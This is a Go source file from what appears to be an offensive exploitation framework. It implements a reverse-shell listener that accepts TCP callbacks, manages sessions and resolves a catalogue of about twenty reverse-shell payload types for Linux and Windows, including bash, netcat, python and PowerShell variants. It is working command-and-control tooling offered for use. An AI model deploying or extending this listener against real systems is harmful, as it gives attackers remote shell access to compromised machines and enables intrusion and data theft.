package shell

import (
	"fmt"
	"net"

	"github.com/Chocapikk/pik/pkg/c2"
	"github.com/Chocapikk/pik/pkg/c2/session"
	"github.com/Chocapikk/pik/pkg/output"
	"github.com/Chocapikk/pik/pkg/payload"
)

// Listener is a built-in TCP reverse shell listener with session management.
type Listener struct {
	c2.SessionBase
	lhost string
	lport int
}

var payloads = c2.PayloadMap{
	"cmd/bash/reverse_tcp":          payload.Bash,
	"cmd/bash/reverse_tcp_min":      payload.BashMin,
	"cmd/bash/reverse_fd":           payload.BashFD,
	"cmd/bash/reverse_readline":     payload.BashReadLine,
	"cmd/python/reverse_tcp":        payload.Python,
	"cmd/python/reverse_tcp_min":    payload.PythonMin,
	"cmd/python/reverse_tcp_pty":    payload.PythonPTY,
	"cmd/perl/reverse_tcp":          payload.Perl,
	"cmd/ruby/reverse_tcp":          payload.Ruby,
	"cmd/php/reverse_tcp":           payload.PHP,
	"cmd/php/reverse_tcp_min":       payload.PHPMin,
	"cmd/php/reverse_tcp_exec":      payload.PHPExec,
	"cmd/netcat/reverse_tcp":        payload.Netcat,
	"cmd/netcat/reverse_mkfifo":     payload.NetcatMkfifo,
	"cmd/netcat/reverse_openbsd":    payload.NetcatOpenbsd,
	"cmd/socat/reverse_tty":         payload.Socat,
	"cmd/java/reverse_tcp":          payload.Java,
	"cmd/nodejs/reverse_tcp":        payload.NodeJS,
	"cmd/awk/reverse_tcp":           payload.Awk,
	"cmd/lua/reverse_tcp":           payload.Lua,
	"cmd/powershell/reverse_tcp":    payload.PowerShell,
	"cmd/powershell/reverse_conpty": payload.PowerShellConPTY,
}

func New() *Listener { return &Listener{} }

func (l *Listener) Name() string { return "shell" }

func (l *Listener) Setup(lhost string, lport int) error {
	l.lhost = lhost
	l.lport = lport
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", lhost, lport))
	if err != nil {
		return fmt.Errorf("failed to start listener: %w", err)
	}
	l.Manager = session.NewManager(ln)
	l.Manager.Start()
	output.Status("Listening on %s:%d", lhost, lport)
	return nil
}

func (l *Listener) GeneratePayload(targetOS, payloadType string) (string, error) {
	fallback := payload.Bash
	if targetOS == "windows" {
		fallback = payload.PowerShell
	}
	return c2.ResolvePayload(payloads, l.lhost, l.lport, payloadType, fallback)
}

func (l *Listener) Shutdown() error { return l.ShutdownManager() }
